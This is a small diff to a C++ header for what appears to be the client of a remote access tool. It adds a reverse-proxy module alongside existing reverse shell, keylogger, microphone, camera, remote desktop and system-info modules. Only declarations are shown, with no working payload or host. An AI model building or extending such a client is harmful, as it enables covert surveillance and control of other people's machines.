@@ -1,5 +1,5 @@
 #ifndef _CLIENTE_H
-#define _CLIENTE_H
+#define _CLIENTE_H 1
 
 #include "headers.hpp"
 #include "mod_mic.hpp"
@@ -8,6 +8,7 @@
 #include "mod_remote_desktop.hpp"
 #include "mod_ventanas.hpp"
 #include "mod_info.hpp"
+#include "mod_reverse_proxy.hpp"
 
 struct Paquete {
 	u_int uiTipoPaquete;
@@ -35,7 +36,6 @@ struct Archivo_Descarga {
 class ReverseShell;
 class Mod_Mic;
 
-
 class Cliente {
 	private:
 		std::mutex sck_mutex;
@@ -53,14 +53,14 @@ class Cliente {
 		void Init_Key();
 
 		//Modulos
-		ReverseShell*      reverseSHELL   = nullptr;
-		Mod_Mic*           mod_Mic        = nullptr;
-		mod_Keylogger*     mod_Key        = nullptr;
-		mod_Camera*        mod_Cam        = nullptr;
-		mod_RemoteDesktop* mod_RemoteDesk = nullptr;
-		mod_AdminVentanas* mod_AdminVen   = nullptr;
-		mod_Info*          mod_Inf0       = nullptr;
-
+		ReverseShell*      reverseSHELL     = nullptr;
+		Mod_Mic*           mod_Mic          = nullptr;
+		mod_Keylogger*     mod_Key          = nullptr;
+		mod_Camera*        mod_Cam          = nullptr;
+		mod_RemoteDesktop* mod_RemoteDesk   = nullptr;
+		mod_AdminVentanas* mod_AdminVen     = nullptr;
+		mod_Info*          mod_Inf0         = nullptr;
+		
 		//Map para armar los paquetes entrantes
 		std::map<int, std::vector<char>> paquetes_Acumulados;
 
@@ -81,6 +81,8 @@ class Cliente {
 
 		Cliente();
 		~Cliente();
+		
+		ReverseProxy* mod_ReverseProxy = nullptr;
 		
 		//Misc
 		std::string ObtenerDesk();
